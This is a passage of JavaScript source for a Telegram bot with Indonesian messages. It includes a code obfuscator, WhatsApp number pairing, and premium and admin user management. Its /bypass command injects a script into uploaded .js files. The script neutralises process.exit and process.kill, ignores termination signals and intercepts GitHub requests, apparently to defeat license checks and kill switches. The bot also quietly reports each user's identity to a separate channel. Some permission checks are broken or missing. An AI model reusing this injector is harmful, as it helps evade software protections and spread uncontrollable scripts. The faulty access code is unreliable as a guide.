            caption: "✅ *File terenkripsi (Aphocalyps Chaos Core) siap!*\n_©𝚇𝚊𝚝𝚊 ENC_",
            parse_mode: "Markdown"
        });

        await updateProgress(bot, chatId, progressMessage, 100, "Aphocalyps Chaos Core Selesai");

        // Hapus file setelah dikirim
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    } catch (error) {
        await bot.sendMessage(chatId, `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`, { parse_mode: "Markdown" });

        // Hapus file jika ada error
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    }
});


bot.onText(/\/reqpair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/regis(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add regist users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /regist 123456789 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /regis 123456789 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /regis 123456789 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/cekregis/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the regis list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - R E G I S T \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delregis(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove regis users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /regis 123456789");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the regis list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the regis list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const link = match[1];
    
    
    let result = await getWhatsAppChannelInfo(link);

    if (result.error) {
        bot.sendMessage(chatId, `⚠️ ${result.error}`);
    } else {
        let teks = `
 *Informasi Channel WhatsApp*
 *ID:* ${result.id}
 *Nama:* ${result.name}
 *Total Pengikut:* ${result.subscribers}
 *Status:* ${result.status}
 *Verified:* ${result.verified}
        `;
        bot.sendMessage(chatId, teks);
    }
});

bot.onText(/\/addowner (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = String(msg.from.id);
    
    if (!developerIds.includes(userId)) {
        return bot.sendMessage(chatId, "❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    
    const ownerId = match[1];
    await addOwner(ownerId);
    bot.sendMessage(chatId, `✅ Berhasil menambahkan ${ownerId} sebagai Owner.`);
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = String(msg.from.id);
    
  if (!ownerId.includes(userId) && !isAdmin(userId)) {
        return bot.sendMessage(chatId, "❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    
    const ownerId = match[1];
    await deleteOwner(ownerId);
    bot.sendMessage(chatId, `✅ Berhasil menghapus ${ownerId} dari daftar Owner.`);
});

bot.onText(/\/addadmin (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = String(msg.from.id);
    
    if (!userId.includes(userId) && !isAdmin(userId)) {
        return bot.sendMessage(chatId, "❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    
    const ownerId = match[1];
    
    bot.sendMessage(chatId, `✅ Berhasil menambahkan ${ownerId} sebagai Admin.`);
});

bot.command('bypass', async (ctx) => {
  saveUser(ctx.from.id);
  const file = ctx.message.document;

  if (!file.file_name.endsWith('.js') && !file.file_name.endsWith('.txt')) {
    return ctx.reply('```\n❌ Hanya file `.js` yang didukung.\n```', {
      reply_to_message_id: ctx.message.message_id,
      parse_mode: "MarkdownV2"
    });
  }

  const progressMsg = await ctx.reply('```Proses........```', {
    reply_to_message_id: ctx.message.message_id,
    parse_mode: "MarkdownV2"
  });

  try {
    const link = await ctx.telegram.getFileLink(file.file_id);
    const response = await axios.get(link.href);
    const originalContent = response.data;

    const bypassScript = `const axios = require("axios");
const chalk = require("chalk");
function requestInterceptor(cfg) {
  const urlTarget = cfg.url;
  const domainGithub = [
    "github.com",
    "raw.githubusercontent.com",
    "api.github.com",
  ];
  const isGitUrl = domainGithub.some((domain) => urlTarget.includes(domain));
  if (isGitUrl) {
    console.warn(
      chalk.blue(\`
██████╗░██╗░░░██╗██████╗░░█████╗░░██████╗░██████╗
██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██████╦╝░╚████╔╝░██████╔╝███████║╚█████╗░╚█████╗░
██╔══██╗░░╚██╔╝░░██╔═══╝░██╔══██║░╚═══██╗░╚═══██╗
██████╦╝░░░██║░░░██║░░░░░██║░░██║██████╔╝██████╔╝
╚═════╝░░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░\`) +
        chalk.green("\\n]|• 𝙶𝙸𝚃𝙷𝚄𝙱 𝚁𝙰𝚆 ::" + urlTarget)
    );
  }
  return cfg;
}
function errorInterceptor(error) {
  const nihUrlKlwError = error?.config?.url || "URL TIDAK DIKETAHUI";
  console.error(
    chalk.green("𝗙𝗔𝗜𝗟𝗘𝗗 𝗧𝗢 𝗔𝗖𝗖𝗘𝗦𝗦: " + nihUrlKlwError)
  );
  return Promise.reject(error);
}
axios.interceptors.request.use(requestInterceptor, errorInterceptor);
const originalExit = process.exit;
process.exit = new Proxy(originalExit, {
  apply(target, thisArg, argumentsList) {
    console.log(chalk.blue("BYPASS TELAH AKTIF"));
  },
});
const originalKill = process.kill;
process.kill = function (pid, signal) {
  if (pid === process.pid) {
    console.log(chalk.blue("BYPASS TELAH AKTIF"));
  } else {
    return originalKill(pid, signal);
  }
};
["SIGINT", "SIGTERM", "SIGHUP"].forEach((signal) => {
  process.on(signal, () => {
    console.log(chalk.red("SINYAL " + signal + " TERDETEKSI DAN DIABAIKAN"));
  });
});
function vvvvvvv2(cfg) {
  const urlTarget = cfg.url;
  const domainGithub = [
    "github.com",
    "raw.githubusercontent.com",
    "api.github.com",
  ];
  const isGitUrl = domainGithub.some((domain) => urlTarget.includes(domain));
  if (isGitUrl) {
    console.warn(
     chalk.green("\\n ]|• 𝙶𝙸𝚃𝙷𝚄𝙱 𝚁𝙰𝚆 ::" + urlTarget)
    );
  }
  return cfg;
}
function startProgressBar() {
    const progressSteps = [
        "[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□]",
    ];
    const colors = [
        chalk.redBright,
        chalk.yellowBright,
        chalk.greenBright,
        chalk.cyanBright,
        chalk.blueBright,
        chalk.magentaBright,
        chalk.whiteBright,
    ];
    let step = 0;
    let colorIndex = 0;
    setInterval(() => {
        console.clear();
        console.log(chalk.cyanBright(\`
██████╗░██╗░░░██╗██████╗░░█████╗░░██████╗░██████╗
██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██████╦╝░╚████╔╝░██████╔╝███████║╚█████╗░╚█████╗░
██╔══██╗░░╚██╔╝░░██╔═══╝░██╔══██║░╚═══██╗░╚═══██╗
██████╦╝░░░██║░░░██║░░░░░██║░░██║██████╔╝██████╔╝
╚═════╝░░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░\`));
       axios.interceptors.request.use(vvvvvvv2, errorInterceptor);
        const color = colors[colorIndex % colors.length];
        console.log(color.bold(progressSteps[step]));
        
        step = (step + 1) % progressSteps.length;
        colorIndex++;
    }, 200);
}
startProgressBar();`;
    const newContent = `${bypassScript}\n${originalContent}`;
    const newFileName = `bypass by •Ryu• ${file.file_name}`;
    const tempDir = path.join(__dirname, 'temp');
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
    const tempPath = path.join(tempDir, newFileName);

    fs.writeFileSync(tempPath, newContent);

    await ctx.replyWithDocument(
      { source: tempPath, filename: newFileName },
      {
        caption: '```\n✅ File selesai diproses.\n```',
        parse_mode: "MarkdownV2",
        reply_to_message_id: ctx.message.message_id,
        ...Markup.inlineKeyboard([
          [Markup.button.url('Developer', 'https://t.me/vonzie123')]
        ])
      }
    );
    await ctx.telegram.sendMessage(-1002854649058, 
`\`\`\`BYPASS Ryu
✅ Add bypass selesai!
👤 User : ${ctx.from.first_name}
☘️ Username : @${ctx.from.username}
🆔 User Id : ${ctx.from.id}
📁 File: ${file.file_name}\`\`\``, {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: `${ctx.from.first_name}`, url: `tg://user?id=${ctx.from.id}` }]]
        }
      });
    fs.unlinkSync(tempPath);
    ctx.deleteMessage(progressMsg.message_id);
  } catch (err) {
    console.error(err);
    ctx.reply('✅ PROGRESS SELESAI');
  }
});

bot.onText(/\/deladmin (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = String(msg.from.id);
    
    if (!ownerId.includes(userId)) {
        return bot.sendMessage(chatId, "❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    
    const ownerId = match[1];
    await deleteAdmin(ownerId);
    bot.sendMessage(chatId, `✅ Berhasil menghapus ${ownerId} dari daftar Admin.`);
    try {
    } catch (error) {
    console.error("Error:", error);
  }
}); // <--- ini biasanya penutup event bot.on() atau fungsi besar